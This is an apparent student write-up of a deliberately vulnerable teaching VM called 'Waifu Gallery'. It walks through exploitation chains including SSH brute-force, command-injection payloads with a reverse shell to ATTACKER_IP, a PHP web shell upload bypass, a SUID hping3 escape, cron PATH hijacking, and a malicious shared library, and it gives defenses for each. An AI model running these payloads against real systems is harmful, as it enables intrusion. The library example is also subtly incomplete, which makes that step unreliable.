# Boot2Root VM Design: Waifu Gallery – Artificial Vulnerability Orchestration

## Academic Project: Design and Implementation of a Controlled Vulnerable Environment

**Project Context:**
- **University:** Sapienza University of Rome, Master's Degree in Cybersecurity
- **Course:** Ethical Hacking & Penetration Testing (A.Y. 2023/24)
- **Target:** Design of a vulnerable virtual machine intended for educational simulations in an exam environment
- **Deliverable:** Working Linux VM + Official technical report + Source code

**Technologies & Stack:**
- **Operating System:** Ubuntu 20.04.6 LTS
- **Web Stack:** Apache2 + PHP
- **Backend Logic:** Bash scripting, C (exploit compilation)
- **Implemented Vulnerabilities:** 6 distinct (3 Access Vectors, 3 Privilege Escalation), Easy/Medium/Hard levels
- **Infrastructure:** Git versioning for tracking

---

## 1. Concept & System Architecture

### 1.1 How We Thought About It

The VM had to be based on a real and plausible server, so it was necessary that:

1. **It was realistic** – We decided to be inspired by an early 2000s web gallery, as it seemed an optimal solution to have a known and not overly complex type of web app.
2. **It had a plot** – The anime theme was thought of knowing that the prof. was a fan: moreover, there is a sort of internal narrative with various easter eggs and hidden clues.
3. **It was progressive** – Easy vulnerabilities to understand the flow, Medium to learn the bypass for the RCE, Hard for having done correct enumeration and filter bypass for LFI.

**The Choice: Waifu Gallery**
A board of anime characters from the 90s to mid 2000s. Why? Because it's credible, it's a web service that actually was a thing and they continue to exist and be frequented, the students already knew what we were talking about and there was no excessive complexity of the service that would have caused unnecessary flow slowdowns.

### 1.2 Architecture: Where We Put What

Every vulnerability had to be in a specific place in the system, to encourage exploration by the attacker:

| Component | What It Is | Where To Attack |
|---|---|---|
| **Frontend** | PHP Gallery with search bar | Web Command Injection (search bar) |
| **Hidden upload** | imposter.php (non-linked) | File Upload double extension bypass |
| **Backend Filters** | Command blacklist + regex | Bypassable with `;;` and `##` |
| **System User** | `amogus` with password `sus1` | SSH brute-force (name discoverable via UI hint) |
| **hping3 SUID** | Binary with active SUID bit | Instant root shell |
| **Cronjob** | Writable script, executed as root | PATH hijacking |
| **ld.so config** | Library in writable path | Library hijacking + custom assembly |

**Intended progression:**
- **Easy:** Discover the user from the UI => SSH brute-force => find SUID hping3
- **Medium:** Bypass the web search filter => discover the cronjob, modify it and wait for the root rev. shell
- **Hard:** Find imposter.php and bust the upload filter => create the malicious C library, replace it, hijack ld.so

---

## 2. Vulnerability Landscape & Exploitation Chains

### 2.1 Vulnerability Summary Matrix

| #  | Vulnerability Name | Category | Difficulty | Prerequisites | Post-Exploitation |
|----|----|---|---|---|---|
| **3.1** | Weak SSH Credentials | Initial Access | ⭐ EASY | None (public brute-force) | User shell `amogus` |
| **3.2** | Web Command Injection | RCE | ⭐⭐ MEDIUM | Web app access (default) | RCE as www-data user |
| **3.3** | File Upload + Shell Execution | LFI | ⭐⭐⭐ HARD | Hidden page recon + upload bypass + execution | www-data shell + persistent backdoor |
| **4.1** | SUID Binary Exploitation (hping3) | Privilege Escalation | ⭐ EASY | Non-root user shell | Instant root shell |
| **4.2** | Insecure Cronjob PATH | Privilege Escalation | ⭐⭐ MEDIUM | User access + timing wait | Root shell (from reverse shell) |
| **4.3** | LD_LIBRARY_PATH Hijacking | Privilege Escalation | ⭐⭐⭐ HARD | SUID binary + writable library path + C compilation skills | Root shell |

### 2.2 Attack Chain Visualization

```
┌────────────────────────────────────────────────────────┐
│ INITIAL ACCESS                                         │
│ ├─ [3.1] SSH brute-force (amogus:sus1)     ← Easiest   │
│ └─ [3.1] HTTP Reconnaissance → UI hints                │
└────────────────────┬───────────────────────────────────┘
                     │
                     ▼
┌────────────────────────────────────────────────────────┐
│ LATERAL MOVEMENT / WEB RCE                             │
│ ├─ [3.2] Command Injection via search bar  ← Via ;;##  │
│ │         shell_exec() bypass                          │
│ └─ [3.3] Hidden upload page (imposter.php)             │
│          shell.php.jpg double extension bypass         │
└────────────────────┬───────────────────────────────────┘
                     │
                     ▼
┌────────────────────────────────────────────────────────┐
│ PRIVILEGE ESCALATION (Choose One)                      │
│ ├─ [4.1] SUID hping3 → /bin/sh -p          ← Easy      │
│ ├─ [4.2] Cronjob PATH manipulation                     │
│ └─ [4.3] LD_LIBRARY_PATH hijacking         ← Hard      │
└────────────────────────────────────────────────────────┘
```

**Educational Key:**
Every level demonstrates real concepts encountered in professional engagements:
- **Easy:** Basic reconnaissance + weak credentials + OSINT
- **Medium:** Insufficient sanitization + misunderstanding of shell metacharacters
- **Hard:** Deep understanding of ELF loader + exploitation of complex privilege boundaries

---

## 3. Access Vulnerabilities (Personal Implementation)

In this section, the entry vectors designed and implemented to allow the attacker to gain initial access to the system are described.

### 3.1 Weak SSH Credentials – Easy Mode

#### Setup
The user `amogus` with password `sus1` is the first clue. The name is a reference to Among Us (the game), which at the time was famous in our study groups. We knew the other students would recognize it.

The password is not in the UI anywhere, but the name is: randomly opening the DevTool one of the images will be as follows:
```html
<img src="..." title="amogus" ...>
```

Furthermore, there is a visual clue hidden in the home page: an image in the grid is randomly chosen among the last rows, hovering the pointer, the Ascii art of _Among Us_ will appear in transparency. The clue was placed to reward searching image by image, its position also being random. 

So to solve this vulnerability you need:
1. Observe the UI (open browser inspector)
2. Identify the hidden title
3. Attempt brute-force on SSH with that name

#### The Exploit
```bash
# Reconnaissance: hover over an image, see the tooltip
# Or F12 → Inspector, search title attribute

# SSH Brute-force (or dictionary for near-instant solution)
hydra -l amogus -P wordlist.txt ssh://<vm_ip>
# Later: ssh amogus@<vm_ip> with password "sus1"
```

It's Easy because there's no hidden logic: the name is visible in the UI, the password is trivial. The only "effort" is understanding you have to use SSH, also because in the web app there are no login forms or anything else. Furthermore, *sus* is the term most closely related to _amogus_, so creating the wordlist is very fast.

### 3.2 Web Command Injection – Medium Mode

#### The Vulnerability
The search bar searches for images with `shell_exec("ls $image_folder$query*.jpg")`. The filter was blacklist-based: blocks `bash`, `nc`, `wget`, specific commands. However, we deliberately left a hole.

If you use `;` or `#` directly, those are blocked. BUT if you use `;;` or `##`, the filter only recognizes the first one leaving out the second character allowing code injection. Then there's an `str_replace()` that converts them to singles (inserted for convenience in the RCE execution, without creating artificial difficulty):
```php
if (strpos($query, ";;") !== false && strpos($query, "##") !== false) {
    $query = str_replace(";;", ";", $query);    // ;; -> ;
    $query = str_replace("##", "#", $query);    // ## -> #
}
```

The check happens BEFORE the substitution. Therefore `;;ls /##` passes the filter because `;;` is not `;`, it gets not blocked. Had it been done AFTER, it would have been blocked, which is what happens for all other injection types.

#### How to Solve It
```bash
# Direct payloads
;;ls /##             # Lists root directory
;;cat /etc/passwd##  # Reads sensitive files
;;whoami##           # See who you are

# More complex payloads (reverse shell):
;;bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1##
```

**Defense:**
Do not use `shell_exec` with user input. Or if you do:
1. **Whitelist** – only accept safe characters: `preg_replace('/[^a-zA-Z0-9_-]/', '', $query)`
2. **escapeshellarg()** – if you really must use shell_exec: `escapeshellarg($query)`
3. **Better: PHP native** – `glob("images/{$query}*.jpg")` without shell

### 3.3 File Upload Bypass – Hard Mode

#### The Idea
We created a hidden page `imposter.php` that is not linked anywhere. If you find it and access it, you can upload a file.

The filter only checks the final extension via `pathinfo()`. Therefore:
- `shell.php.jpg` → extension = `.jpg` ✅ passes the filter
- But the file saves as `shell.php.jpg` and if Apache executes it as PHP → RCE

#### How to Find It
```bash
# 1. Brute force
gobuster dir -u http://<vm_ip> -w /usr/share/wordlists/common.txt
# Discover imposter.php

# 2. Or if you have RCE from the command injection:
cat index.php | grep -i "upload\|form\|POST"  # Find links to imposter.php
```

#### The Exploit
```bash
# Create a web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Rename with double extension
mv shell.php shell.php.jpg

# Upload
curl -F "image=@shell.php.jpg" http://<vm_ip>/imposter.php

# Execute
curl "http://<vm_ip>/images/shell.php.jpg?cmd=id"
# uid=33(www-data) ...
```

#### Defense
1. **Check magic bytes** – Not extension. `getimagesize()` verifies if it's really an image
2. **Rename the file** - Generate random name: `bin2hex(random_bytes(16)) . ".jpg"`
3. **Store outside webroot** - Save in `/var/uploads/`, not where Apache can execute
4. **Disable PHP execution** in the upload folder (.htaccess or web.config)

## 4. Privilege Escalation – How to Become Root

### 4.1 SUID hping3 – Easy

#### What is hping3?
`hping3` is a packet crafting tool, similar to `ping` but on steroids. It's used to test firewalls, create custom packets, stuff like that. It should NEVER have SUID.

#### The Exploit
```bash
# Enumerate SUID binaries
find / -perm -4000 -type f 2>/dev/null | grep hping
# Output: /usr/sbin/hping3

# Execute hping3 (which is SUID root)
$ /usr/sbin/hping3
hping3 > /bin/sh -p

# Boom, you're root
$ whoami
root
```

The `-p` flag of `/bin/sh` is critical: "preserve mode". Without it, the shell drops privileges automatically.

#### Why it works
`hping3` with SUID executes as root. Inside hping3 there is a shell escape functionality. Ask for a shell, and the process (which is root) gives it to you. Easy.

#### Defense
```bash
# Remove SUID
chmod -s /usr/sbin/hping3

# Or use sudo with logging
```

### 4.2 Cronjob PATH Hijacking – Medium

#### How it Works
Cronjob (cron) is a Linux scheduler that executes scripts periodically. If:
- The script is executed **as root** but is **writable by non-root**
- And uses a **relative path** to execute commands

Then we hijack the executables by adding a fake directory to the PATH where we create our own executables with the same name. When cron executes the command, it finds our fake one.

#### Vulnerability Discovery Phase

**Step 1: Identify the "overwrite.sh" script**
```bash
find / -name "overwrite.sh" -type f -writable 2>/dev/null
# Output: /home/developer/overwrite.sh
```

**Step 2: Examine the script content**
```bash
cat /home/developer/overwrite.sh
# Output uses RELATIVE paths:
# ls /          (instead of: /bin/ls /)
# whoami        (instead of: /usr/bin/whoami)
# id            (instead of: /usr/bin/id)
```

#### The Vulnerability: Relative vs Absolute Paths

**How PATH hijacking works:**
When cron executes the script with PATH like `/home/developer:/usr/bin:/bin`:
```
When script executes: ls
System searches:
1. /home/developer/ls        ← Attacker CREATES THIS
2. /usr/bin/ls
3. /bin/ls

Result: Attacker's malicious /home/developer/ls executes as root!
```

#### Exploitation Chain

**Step 1: Create malicious executable**
```bash
cat > /home/developer/ls << 'EOF'
# This will execute as ROOT because cron runs as root!
bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1
EOF
chmod +x /home/developer/ls
```

**Step 2: Set up listener**
```bash
nc -lnvp 7777
# Waiting for reverse shell...
```

**Step 3: Wait for cron execution**
```bash
# Cron will execute overwrite.sh at scheduled time (e.g., every minute)
# When it runs "ls /" inside the script:
# It looks for "ls" in PATH
# Finds /home/developer/ls
# Executes OUR malicious script as root
```

**Step 4: Get root shell**
```bash
root@vm:/# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Remediation (Multi-Layered)

**Layer 1: Use absolute paths in scripts (PRIMARY)**
```bash
# SECURE: All paths are absolute
/bin/ls /
/usr/bin/whoami
/usr/bin/id
/bin/cat /etc/passwd
```

**Layer 2: Set restrictive PATH in cronjob**
```cron
# In /etc/cron.d/example:
PATH=/bin:/usr/bin
SHELL=/bin/bash
* * * * * root /home/developer/overwrite.sh > /dev/null 2>&1
```

**Layer 3: Make scripts non-writable by non-root**
```bash
chmod 750 /home/developer/overwrite.sh
# Now only owner (root) and group can modify
``` 

### 4.3 LD.SO Hijacking – Hard

#### How the ELF Loader Works
The ELF loader (`ld.so`) resolves dynamic libraries that a program needs at runtime. It follows a specific search order:

```bash
1. LD_LIBRARY_PATH (environment variable)
2. /etc/ld.so.cache (compiled cache)
3. /etc/ld.so.conf and /etc/ld.so.conf.d/ (system config)
4. Standard dirs: /lib, /usr/lib, /lib64, /usr/lib64
```

If a SUID binary searches for a library in a **writable** directory, we can put our malware version in there and the SUID binary loads it.

#### Discovery: Finding the Vulnerable Binary

**Step 1: Check for non-standard library paths**
```bash
# Check /etc/ld.so.conf.d/ for unusual paths:
ls -la /etc/ld.so.conf.d/
cat /etc/ld.so.conf.d/* | grep -v "^#"
# Output might include: /home/developer/libs

# Verify if path is writable by non-root:
ls -la /home/developer/libs
```

**Step 2: Find SUID binary with missing library**
```bash
find / -perm -4000 -type f 2>/dev/null

# For each binary, check what libraries it needs:
ldd /usr/sbin/testingapp
# Output example:
#   libcustomapp.so => not found              ← MISSING LIBRARY!
#   libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

#### The Exploit: Creating Malicious Library

**Step 1: Create malicious libcustomapp.so**
```c
// malicious_libcustomapp.c
#include <unistd.h>
void functionLoader() {
    setuid(0);      // Set UID to root
    setgid(0);      // Set GID to root
    system("/bin/sh");  // Spawn shell as root
}
```

**Step 2: Compile the malicious library**
```bash
gcc -shared -fPIC -o libcustomapp.so malicious_libcustomapp.c

# Verify it was created:
file libcustomapp.so
```

**Step 3: Place library in the vulnerable directory**
```bash
cp libcustomapp.so /home/developer/libs/

# Verify placement:
ls -la /home/developer/libs/libcustomapp.so
```

**Step 4: Execute the vulnerable binary**
```bash
/usr/sbin/testingapp

# What happens:
# 1. testingapp starts (SUID means it runs as root)
# 2. ELF loader searches for libcustomapp.so
# 3. Finds our malicious /home/developer/libs/libcustomapp.so FIRST
# 4. Loads OUR library which calls setuid(0) + system("/bin/sh")
# 5. Shell prompt appears as root!

# Result:
# # whoami
# root
```

#### Remediation (Hardening)

**Layer 1: Use absolute paths + remove unsafe entries**
```bash
# Remove or comment out:
cat /etc/ld.so.conf.d/custom.conf
# /home/developer/libs   ← REMOVE THIS

# Rebuild the loader cache:
sudo ldconfig
```

**Layer 2: Remove SUID bit**
```bash
chmod -s /usr/sbin/testingapp
```

**Layer 3: Make library directories read-only**
```bash
chmod 555 /home/developer/libs
```

**Layer 4: Force RPATH (static library path)**
```bash
# When compiling, use -Wl,-rpath:
gcc -o testingapp testingapp.c -lcustomapp -Wl,-rpath=/usr/local/lib/secure
# Binary looks ONLY in /usr/local/lib/secure
# Ignores LD_LIBRARY_PATH and /etc/ld.so.conf.d/
```

## 5. How to Fix It – Defense Strategies

### 5.1 Fix Priorities

| Vulnerability | Severity | Primary Remediation | Impl. Time | Effort | Testing |
|---|---|---|---|---|---|
| 3.1 (Weak SSH) | CRITICAL | SSH key-based + strong policy | 2 hrs | LOW | `ssh-keygen -t ed25519` |
| 3.2 (Cmd Inject) | CRITICAL | Sanitize input + use whitelist | 4 hrs | MEDIUM | `escapeshellarg()` test |
| 3.3 (Upload RCE) | CRITICAL | Magic bytes + disable PHP in upload dir | 3 hrs | MEDIUM | File upload test |
| 4.1 (SUID hping3) | HIGH | Remove SUID bit | 15 min | LOW | `find / -perm -4000` |
| 4.2 (Cronjob) | HIGH | Absolute paths + restrictive PATH | 1 hr | MEDIUM | Monitor cron execution |
| 4.3 (ld.so) | HIGH | Remove unsafe ld.so.conf.d entries | 30 min | LOW | Verify ld.so.conf.d |

### 5.2 The Defense Strategy

**To Do Immediately (Fix Web Vulnerabilities):**
1. Do not use dangerous functions like `shell_exec()` without sanitizing
2. If absolutely necessary, whitelist only safe characters (letters, numbers, wildcard `*`)
3. File uploads: check magic bytes, not just extension
4. Disable PHP in `/images/` with `.htaccess` (Apache) or nginx config

**Next (Eliminate Privilege Escalation):**
5. Remove SUID from unnecessary binaries
6. SSH: use only key-based auth, password disabled
7. Cronjob: always absolute path, never relative
8. LD.SO: audit `/etc/ld.so.conf.d/`, remove user-writable paths
9. Monthly check of SUID binaries with `find / -perm -4000`

**Ongoing (Monitoring):**
10. Scan web input periodically
11. Audit file permissions (monthly)
12. Log analysis for unauthorized access
